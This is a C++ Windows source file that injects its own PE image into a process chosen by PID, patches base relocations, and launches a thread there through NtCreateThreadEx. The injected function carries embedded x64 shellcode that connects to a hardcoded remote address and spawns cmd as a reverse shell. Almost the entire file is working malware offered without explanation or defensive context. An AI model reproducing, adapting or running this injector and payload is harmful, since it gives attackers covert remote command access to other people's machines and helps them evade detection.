#include <WinSock2.h>
#include <stdio.h>
#include <Windows.h>
#include <cstdint>
#include <iostream>

#pragma comment(lib, "Ws2_32")
#pragma warning(disable: 4996)
#pragma warning(disable: 4700)


DWORD execute_reverse_shell() {
	
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8\x0a\x04\x01\x69"
		"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
		"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
		"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
		"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
		"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
		"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
		"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
		"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
		"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
		"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
		"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
		"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
		"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
		"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	HANDLE target_handle = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());

	PVOID target_address = VirtualAllocEx(target_handle, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(target_handle, target_address, buf, sizeof(buf), NULL);

	CreateRemoteThread(target_handle, NULL, NULL, (LPTHREAD_START_ROUTINE)target_address, NULL, NULL, NULL);

	CloseHandle(target_handle);

	return 0;
}

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY; 

typedef NTSTATUS(NTAPI* NtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

int main(int argc, char* argv[])
{
	DWORD target = atoi(argv[1]);

	PVOID Image_base = GetModuleHandle(NULL);		// 1
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)Image_base;
	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)Image_base + dos_header->e_lfanew);		// 2

	PVOID local_address = VirtualAllocEx(GetCurrentProcess(), NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// 3

	memcpy(local_address, Image_base, nt_header->OptionalHeader.SizeOfImage);
	// 4

	HANDLE target_handle = OpenProcess(PROCESS_ALL_ACCESS, false, target);

	PVOID target_address = VirtualAllocEx(target_handle, NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);		// 5

	DWORD_PTR delta = (DWORD_PTR)target_address - (DWORD_PTR)Image_base; // 6

	PIMAGE_BASE_RELOCATION relocation_table = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)local_address + nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	int relocation_count = 0;
	PDWORD_PTR patch_address;
	PBASE_RELOCATION_ENTRY relocation_RVA = NULL;

	while (relocation_table->SizeOfBlock > 0) // 7
	{
		relocation_count = (relocation_table->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
		relocation_RVA = (PBASE_RELOCATION_ENTRY)(relocation_table + 1);

		for (size_t i = 0; i < relocation_count; i++)
		{
			if (relocation_RVA[i].Offset)
			{
				patch_address = (PDWORD_PTR)((DWORD_PTR)local_address + relocation_table->VirtualAddress + relocation_RVA[i].Offset);
				*patch_address += delta;
			}
		}

		relocation_table = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocation_table + relocation_table->SizeOfBlock);
	}

	WriteProcessMemory(target_handle, target_address, local_address, nt_header->OptionalHeader.SizeOfImage, NULL); // 8

	NtCreateThreadEx pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

	if (pNtCreateThreadEx == NULL)
	{
		CloseHandle(target_handle);
		std::cerr << "NtCreateThreadEx Failed " << std::endl;
	}

	HANDLE thread_handle = NULL;

	pNtCreateThreadEx(&thread_handle, 0x1fffff, NULL, target_handle, (LPTHREAD_START_ROUTINE)((DWORD_PTR)execute_reverse_shell + delta), NULL, NULL, NULL, NULL, NULL, NULL); 


	return 0;
}